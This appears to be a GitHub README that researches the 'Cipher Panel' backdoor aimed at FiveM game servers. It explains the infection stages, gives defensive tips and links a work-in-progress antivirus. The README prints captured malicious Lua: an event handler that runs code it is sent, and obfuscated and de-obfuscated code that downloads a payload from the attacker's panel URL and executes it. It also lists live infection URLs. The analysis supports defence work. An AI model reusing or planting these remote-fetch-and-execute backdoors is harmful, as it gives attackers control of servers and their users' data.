# MaliciousPanel
Cipher Panel Research (To clarify I have 0 connections to the group behind Cipher Panel, I'm merely researching this malicious panel for Cfx and server owners)

Download my WIP AV which currently only tackles the partially detection of the Cipher Panel:
`https://github.com/DamianKnappers/MaliciousPanel/tree/main/HXAV`

With respect to @ericstolly's research, I have dug up more information and together with his research this repo has been created. 
Mainly for information and educational purposes for server owners to figure out how what and where.

The several stages will be found in the files of this repo, there's also tools available (for now very limited) and a file which they infected. Don't worry it's only effective whenever you drop this file in the server files at the right position.

Original Infection URL:
`https://cipher-panel.me/_i/i.php?to=0`
From this it goes through the several stages

Explaination of the several stages:

*Stage 1*: This stage is the "exploit" stage, just depends on what you want to name it. 
In this stage they are gaining entry into your FiveM server and talking with their panel. 

*Stage 2*: This stage is the Payload phase, this is when they're re-writing your sessionmanager files and build a control base for further spreading and infection of other resources.

*Stage 3*: This is the spread phase, this is mainly a bridge between phase 2 and phase 4, this is where local functions are added throughout several scripts and where the fxmanifests are edited to use / run MySQL statements assumably for gaining access to the IP's and user data. But most these days use other mysql scripts so it's pretty obvious when there is a `server_script {'@mysql-async/lib/MySQL.lua'}` added. 

*Stage 4*: This is the control stage, this is where the panel sends out triggers to the several listening functions, how they do it? Read in phase 4 docs.
In the basis they're performing simple HTTP requests to their panel. Whenever the panel sends out a call to action, the response in the web body changes and the functions reading the web body will then distribute the events either client or server sided. Also txAdmin is victim of this, disabling the whitelist for example or bypassing a txAdmin ban.

**Tips for now**:
- Use a other mysql script
- Use a 3rd Party script for your bans and whitelist
- Disable their website in the hosts file (in case of Windows)
- Re-install the fresh sessionmanager
- Use notepad++ to search for any obfuscated functions with the information that will be available per phase documentation

**Traces Found**:
```
RegisterNetEvent('helpCode')

AddEventHandler('helpCode', function(id)
	local help = assert(load(id))
	help()
end)
```
Code from stage2 or stage3 will be send via a event and executed here. 

In rconlog we found some obfuscated code, which is the same as the stage2 code but a different page which still these days is unknown what it's contents are or how to gain the contents of this page. Only thing known is that it's in the server sided and downloads the body of the page. 
https://cipher-panel.me/_i/r.php?to=0

Code:
```
local BaoWmVjtyB = {
	_G['PerformHttpRequest'],
	_G['assert'],
	_G['load'],
	_G['tonumber']
}

local CKGzkhSwYw = {
	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
}

function uGeRrdKRtK()
	JJcQCUzzCK = ''
	for id,it in pairs(CKGzkhSwYw) do
		JJcQCUzzCK = JJcQCUzzCK..it
	end
	return (JJcQCUzzCK:gsub('..', function (luwOyroAEjA)
		return string.char(BaoWmVjtyB[4](luwOyroAEjA, 16))
	end))
end

BaoWmVjtyB[BaoWmVjtyB[4]('1')](uGeRrdKRtK(), function (e, jKlDPYMVkD)
	local YlEkQSXGlZ = BaoWmVjtyB[BaoWmVjtyB[4]('2')](BaoWmVjtyB[BaoWmVjtyB[4]('3')](jKlDPYMVkD))
	if (jKlDPYMVkD == nil) then return end
	YlEkQSXGlZ()
end)
```
Doing our magical de-obfuscating and using the dehex function we can see that it downloads (just like the rest) the contents of the page r.php and executes it. The methods are the same as in the sessionmanager host_lock.lua file.
De-Obfuscated Code:
```
local VarArray = {
	_G['PerformHttpRequest'],
	_G['assert'],
	_G['load'],
	_G['tonumber']
}

local HEXArray = {
	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',
	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',
	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '30'
}

function Func1()
	String = ''
	for id,it in pairs(HEXArray) do
		String = String..it
	end
	return (String:gsub('..', function (var1)
		return string.char(VarArray[4](var1, 16))
	end))
end

PerformHttpRequest(Func1(), function (e, responseBody)
	local Payload = assert((load(responseBody)))
	if (responseBody == nil) then return end
	Payload()
end)
```
Simple CURL request to https://cipher-panel.me/_i/r.php?to=0 (Which is the HEX Array but in plain text), we get a different result.

```
PerformHttpRequest('https://cipher-panel.me/_i/v2_/stage3?to=0', function (e, d) pcall(function() assert(load(d))() end) end)
```
It sends us to this page but not the actual stage3.php, there seems to be a difference in that. 
